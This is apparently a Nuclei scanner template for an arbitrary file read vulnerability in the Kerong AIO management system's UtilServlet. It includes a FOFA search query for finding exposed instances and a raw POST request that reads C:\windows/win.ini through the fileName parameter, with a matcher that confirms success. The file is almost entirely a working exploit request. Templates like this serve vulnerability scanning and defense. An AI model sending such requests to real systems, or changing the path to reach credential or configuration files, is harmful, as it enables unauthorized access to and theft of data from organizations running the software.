id: kerong-AIO-UtilServlet-fileread

info:
  name: 科荣AIO管理系统-UtilServlet-任意文件读取
  author: HuanXiong
  severity: high
  metadata:
    fofa-query: body="changeAccount('8000')"

  tags: File Reading

http:
  - raw:
      - |
        POST /UtilServlet HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        sec-ch-ua-mobile: ?0
        Cache-Control: no-cache
        Pragma: no-cache
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        sec-ch-ua: "Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"
        sec-ch-ua-platform: "Windows"
        Accept-Language: zh-CN,zh;q=0.9
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0

        operation=readErrorExcel&fileName=C:\windows/win.ini

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"[fonts]")'